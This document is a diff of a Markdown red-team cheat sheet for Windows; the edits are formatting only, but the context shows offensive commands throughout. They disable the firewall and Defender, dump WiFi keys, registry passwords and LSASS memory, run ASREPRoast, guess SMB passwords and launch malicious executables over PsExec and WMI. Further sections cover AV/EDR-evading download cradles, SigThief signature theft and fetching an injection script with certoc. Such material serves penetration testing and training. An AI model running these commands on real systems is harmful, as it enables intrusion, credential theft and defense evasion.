@@ -236,6 +236,7 @@ TcpTestSucceeded : True
 ```
 PS> powershell.exe -command "netsh advfirewall set allprofiles state off"
 ```
+
 ## Enumerating Domain Controllers with PowerShell
 
 ```
@@ -243,7 +244,6 @@ PS> powershell.exe -command "netsh advfirewall set allprofiles state off"
 ```
 
 ## Enumerating Domain Users with PowerShell
-
 
 Save all Domain Users to a file
 
@@ -392,6 +392,7 @@ netsh wlan show profiles
 ```
 netsh wlan show profile name="SSID" key=clear
 ```
+
 ## Potential Credential Files
 
 ```
@@ -413,6 +414,7 @@ findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
 ```
 reg query HKLM /f password  /t REG_SZ  /s 
 ```
+
 ## Local Domain Recon
 
 Shows the domain:
@@ -468,6 +470,7 @@ wmic process list brief
 wmic process get name, parentprocessid,processid
 wmic process where processid=pid get commandline
 ```
+
 ## WMI Recon
 
 ```
@@ -517,6 +520,7 @@ Disabling Windows Defender in the Registry:
 ```
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 ```
+
 ## Examining Unusual Accounts
 
 ```
@@ -562,6 +566,7 @@ tcpdump -r <file> 'src host 8.8.8.8'
 tcpdump -r <file> 'not src host 8.8.8.8'
 tcpdump -r <file> 'icmp and (src host 8.8.8.8'
 ```
+
 ## PSExec'ing
 
 Running PsExec by uploading malicious executable:
@@ -592,7 +597,7 @@ ifm: quit
 ntdsutil: quit
 ```
 
-## Payload Download Cradles: (https://github.com/VirtualAlllocEx)
+## Payload Download Cradles: (<https://github.com/VirtualAlllocEx>)
 
 This are different types of download cradles which should be an inspiration to play and create new download cradles to bypass AV/EPP/EDR in context of download cradle detections. Notice, removing or obfuscating signatures from your download cradle is only one piece of the puzzle to bypass an AV/EPP/EDR. Depending on the respective product you have to modify your payload which should be downloaded by the cradle to bypass API-Hooking, Callbacks, AMSI etc.
 
@@ -668,6 +673,7 @@ Packet drop count: 0
 Packets formatted: 60
 Formatted file:    RoseSecurity-pktmon.pcapng
 ```
+
 ## SMB Password Guessing
 
 Create list of domain users
@@ -676,7 +682,7 @@ Create list of domain users
 C:\> net user /domain > users.txt
 ```
 
-Create password list 
+Create password list
 
 ```
 C:\> notepad pass.txt
@@ -759,6 +765,7 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
+
 ## Dumping LSASS With Visual Studio
 
 Dump64: Memory dump tool that comes with Microsoft Visual Studio
@@ -801,6 +808,7 @@ procdump.exe -accepteula -ma “lsass.exe” out.dmp
 ## Dumping LSASS With NetExec
 
 Using Lsassy and Nanodump:
+
 ```
 nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
 ```
@@ -811,7 +819,7 @@ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
 
 ## Stealing Signatures with SigThief
 
-Download: https://github.com/secretsquirrel/SigThief
+Download: <https://github.com/secretsquirrel/SigThief>
 
 Rips a signature off a signed PE file and appends it to another one, fixing up the certificate table to sign the file.
 
@@ -822,6 +830,7 @@ Output file: /tmp/definitely_legit.exe
 Signature appended. 
 FIN.
 ```
+
 ## CertOC Downloads
 
 Downloads text formatted files
@@ -829,6 +838,7 @@ Downloads text formatted files
 ```
 certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
 ```
+
 ## Shodan for SMB
 
 SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.
@@ -871,6 +881,7 @@ Domain groups:
 rpcclient $> enumdomgroups
 
 ```
+
 Scanning individual users:
 
 ```
@@ -897,9 +908,9 @@ $ smbclient -N -L ip
 Evaluate what the minimum SMB version is for the server:
 
 ```
-$ smbclient -L ip -U username -m NT1
-$ smbclient -L ip -U username -m SMB2
-$ smbclient -L ip -U username -m SMB3
+smbclient -L ip -U username -m NT1
+smbclient -L ip -U username -m SMB2
+smbclient -L ip -U username -m SMB3
 ```
 
 ## Registry Keys for Recent Documents
@@ -915,6 +926,7 @@ Recent Office documents:
 ```
 NTUSER.DAT\Software\Microsoft\Office{Version}{Excel|Word}\FileMRU
 ```
+
 Versions:
 
 - 14.0 Office 2010
@@ -945,14 +957,14 @@ Pixel 4 = R(120), G(101), B(46)
 Pixel 5 = R(0), G(0), B(101)
 Pixel 6 = R(0), G(0), B(0)
 ```
-5. For each color you create, paint 1 pixel working from left to right.
-6. The final image should look something like this:
+1. For each color you create, paint 1 pixel working from left to right.
+2. The final image should look something like this:
 
 ![pixels](https://user-images.githubusercontent.com/72598486/217630466-ef0dec9a-17a3-411f-9067-fa4914684b79.jpg)
 
-7. Now save the picture using the ```File | Save``` as option and choose 24-bit Bitmap as the type.  I saved it as command.bmp
-8. Make a copy of the file and rename it to command.bat.
-9. Double click the file to run the batch file and you will open a command prompt!
+1. Now save the picture using the ```File | Save``` as option and choose 24-bit Bitmap as the type.  I saved it as command.bmp
+2. Make a copy of the file and rename it to command.bat.
+3. Double click the file to run the batch file and you will open a command prompt!
 
 ## BITS Jobs and Downloads
 
@@ -1161,7 +1173,7 @@ wmic.exe /node:"192.168.0.99" process call create "malicious.exe"
 
 ## Offline Microsoft Azure Active Directory Harvesting with PowerShell
 
-This script demonstrates how to interact with Microsoft Azure Active Directory via PowerShell.  You will need an Azure AD account first, which is free: http://azure.microsoft.com/en-us/services/active-directory/
+This script demonstrates how to interact with Microsoft Azure Active Directory via PowerShell.  You will need an Azure AD account first, which is free: <http://azure.microsoft.com/en-us/services/active-directory/>
 
 ```
 # Import the Azure AD PowerShell module:
@@ -1212,6 +1224,7 @@ from a saved evtx file:
 ```
 PS C:\> Get-WinEvent -FilterHashtable @{path="WindowsDefender.evtx";id=1116,1117}
 ```
+
 Check for installed antivirus:
 
 ```
@@ -1297,7 +1310,7 @@ namespace EventLogsForRedTeams
 ```
 
 @BHIS
-Source: https://github.com/roobixx/EventLogForRedTeams
+Source: <https://github.com/roobixx/EventLogForRedTeams>
 
 ## NTLM Leak via Desktop.ini
 
